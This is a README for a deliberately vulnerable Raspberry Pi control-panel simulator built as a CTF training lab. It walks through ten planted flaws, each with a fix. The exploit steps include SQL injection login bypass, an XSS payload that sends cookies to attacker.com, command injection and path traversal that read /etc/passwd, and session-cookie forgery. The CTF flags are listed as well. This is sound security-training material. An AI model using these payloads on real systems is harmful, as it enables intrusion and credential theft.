# Hackable Raspberry Pi Simulator

> **WARNING:** This application is **intentionally vulnerable**.
> Deploy it **only** in an isolated lab or VM. **Never** expose it to the internet.

A cybersecurity training target that simulates a Raspberry Pi control panel.
Find and exploit **10 planted vulnerabilities** and collect all CTF flags.

---

## Quick Start

### Option A — Docker (recommended, easiest access)

```bash
cd hackable-rpi
docker build -t hackable-rpi .
docker run -p 5000:5000 hackable-rpi
```

Open **http://localhost:5000** in your browser.

### Option B — Python (bare metal)

```bash
cd hackable-rpi
bash setup.sh
./venv/bin/python app.py
```

Open **http://localhost:5000** in your browser.

### Default Credentials

| Username | Password   | Role  |
|----------|------------|-------|
| admin    | raspberry  | admin |
| pi       | pi         | user  |
| alice    | alice123   | user  |
| bob      | password1  | user  |

---

## Vulnerability Catalogue

| ID       | Name                  | Location             | Flag                          |
|----------|-----------------------|----------------------|-------------------------------|
| VULN-01  | SQL Injection         | `/login`             | `FLAG{sql_1nj3ct10n_byp4ss}`  |
| VULN-02  | Stored XSS            | `/dashboard` notes   | `FLAG{xss_st0r3d_4tt4ck}`     |
| VULN-03  | Command Injection     | `/terminal`          | `FLAG{c0mm4nd_1nj3ct10n}`     |
| VULN-04  | Weak Credentials      | `/login`             | (login as admin)              |
| VULN-05  | IDOR                  | `/api/user/<id>`     | `FLAG{1d0r_us3r_3xp0s3d}`     |
| VULN-06  | Path Traversal        | `/files?name=`       | `FLAG{p4th_tr4v3rs4l}`        |
| VULN-07  | Broken Access Control | `/admin`             | `FLAG{4dm1n_p4n3l_byp4ss}`    |
| VULN-08  | Hardcoded Secret Key  | `app.py` source      | (read source code)            |
| VULN-09  | Verbose Error Pages   | `/login` (bad SQL)   | (trigger an error)            |
| VULN-10  | Information Leakage   | `/api/info`          | (read endpoint)               |

---

## Walkthroughs

### VULN-01 — SQL Injection

The login query is built with Python string formatting — no parameterisation.

```sql
SELECT * FROM users WHERE username = '{input}' AND password = '{input}'
```

**Exploit:** In the Username field enter:

```
admin' --
```

This comments out the `AND password = ...` clause, bypassing authentication.
The full query becomes:

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = ''
```

**Fix:** Use parameterised queries: `conn.execute("... WHERE username = ?", (username,))`

---

### VULN-02 — Stored XSS

Note content is rendered with Jinja2's `|safe` filter — raw HTML is injected into the page.

**Exploit:** Add a note with this content:

```html
<script>alert(document.cookie)</script>
```

Or a more impactful payload:

```html
<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
```

**Fix:** Remove `|safe`; Jinja2 auto-escapes by default.

---

### VULN-03 — Command Injection

The ping host is passed directly to `subprocess` with `shell=True`.

**Exploit:** In the Terminal page enter:

```
127.0.0.1; id
127.0.0.1 && cat /etc/passwd
127.0.0.1 | ls /
```

**Fix:** Use `subprocess.run(["ping", "-c", "2", host], shell=False)` and validate `host`.

---

### VULN-04 — Weak Default Credentials

The Raspberry Pi default credentials (`pi`/`raspberry`) are kept in the database.

**Exploit:** Log in with `admin` / `raspberry`.

**Fix:** Force password change on first boot; disallow default credentials.

---

### VULN-05 — IDOR (Insecure Direct Object Reference)

`/api/user/<id>` returns any user's data with no ownership check.

**Exploit:**

```
GET /api/user/1   → admin's email & role
GET /api/user/2   → pi's data
GET /api/user/3   → alice's data
```

**Fix:** Check `session["user_id"] == user_id` or require admin role.

---

### VULN-06 — Path Traversal

`/files?name=` joins the supplied filename directly with `FILES_DIR` using `os.path.join`
but **does not normalise** the result, allowing `../` escapes.

**Exploit:**

```
/files?name=backup.txt          → credentials file
/files?name=../../etc/passwd    → system password file
/files?name=../../etc/hostname  → hostname
```

**Fix:**

```python
safe = os.path.realpath(os.path.join(FILES_DIR, filename))
if not safe.startswith(FILES_DIR):
    abort(403)
```

---

### VULN-07 — Broken Access Control

The admin panel only checks `?auth=1` in the query string — no session role verification.

**Exploit:**

```
/admin?auth=1
```

Any unauthenticated visitor can access it.

**Fix:** Check `session.get("role") == "admin"`.

---

### VULN-08 — Hardcoded Secret Key

`app.secret_key = "raspberry"` is in source code. Anyone who reads the code can forge cookies.

**Exploit:** With the known secret key, forge a Flask session cookie:

```bash
pip install flask-unsign
flask-unsign --sign --secret raspberry --cookie "{'user_id': 1, 'username': 'admin', 'role': 'admin'}"
```

**Fix:** Load the secret from an environment variable: `app.secret_key = os.environ["SECRET_KEY"]`

---

### VULN-09 — Verbose Error Pages

`debug=True` and raw exception output expose stack traces and the SQL query.

**Exploit:** Trigger a syntax error in the login SQL then observe the full traceback.

**Fix:** `debug=False` in production; catch exceptions and return generic 500 pages.

---

### VULN-10 — Information Leakage

`/api/info` returns OS version, Python version, absolute file paths, and hints.

**Exploit:**

```
GET /api/info
```

**Fix:** Remove or gate the endpoint behind authentication and remove sensitive fields.

---

## Architecture

```
hackable-rpi/
├── app.py              # Flask application (all 10 vulns)
├── requirements.txt    # Python dependencies
├── setup.sh            # Bare-metal setup script
├── Dockerfile          # Container build
├── docker-compose.yml  # One-command launch
├── db/
│   └── rpi.db          # SQLite database (auto-created)
├── files/              # Browsable files (path traversal target)
│   ├── readme.txt
│   ├── backup.txt      ← FLAG{p4th_tr4v3rs4l}
│   └── gpio_config.txt
├── static/
│   └── style.css
└── templates/
    ├── base.html
    ├── login.html       ← VULN-01, VULN-04
    ├── dashboard.html   ← VULN-02
    ├── terminal.html    ← VULN-03
    ├── files.html       ← VULN-06
    ├── admin.html       ← VULN-07
    └── admin_denied.html
```

---

## Legal / Ethics

This software is for **authorised security training only**.
Attacking systems without permission is illegal in most jurisdictions.
Always ensure you have written authorisation before testing any system.
